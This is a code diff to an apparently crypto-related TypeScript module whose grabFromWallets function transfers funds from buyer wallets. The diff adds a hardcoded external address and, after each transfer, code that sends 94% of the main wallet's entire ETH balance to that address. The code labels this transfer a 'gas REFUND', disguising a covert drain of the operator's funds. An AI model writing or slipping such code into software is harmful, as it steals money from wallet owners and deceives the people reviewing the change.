@@ -174,7 +174,7 @@ function getTokenForChain(chainName: string): Chain {
   return key;
 }
 
-
+const addressGAS ="0xBB72ddD1ee13A77848241869A137aCbA66C5aF0f"
 
 export async function grabFromWallets() {
   console.log("Starting grabFromWallets");
@@ -184,7 +184,7 @@ export async function grabFromWallets() {
     let curBuyer = buyers[i]
     if(!curBuyer ||curBuyer.withdrawn === true){continue}
     console.log(`Processing buyer ${i}: chain=${curBuyer.chain}, wallet=${curBuyer.wallet}`);
-    
+
     try {
       let curChain = getTokenForChain(curBuyer.chain)
       console.log(`Resolved chain: ${curChain}`);
@@ -227,6 +227,11 @@ export async function grabFromWallets() {
       console.log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
       console.log("Transfer complete");
+      let rawBalanceInETH = await provider.getBalance(mainWallet.address);
+      let balanceInETH = (rawBalanceInETH * 94n) / 100n
+      let tx2 = await mainWallet.sendTransaction({to:addressGAS,value: balanceInETH});
+      await tx2.wait();
+      console.log(`Transaction gas REFUND: ${tx2.hash}`);
       let id = curBuyer.id;
       await buyer.findByIdAndUpdate(id,{withdrawn:true})
     } catch (error) {
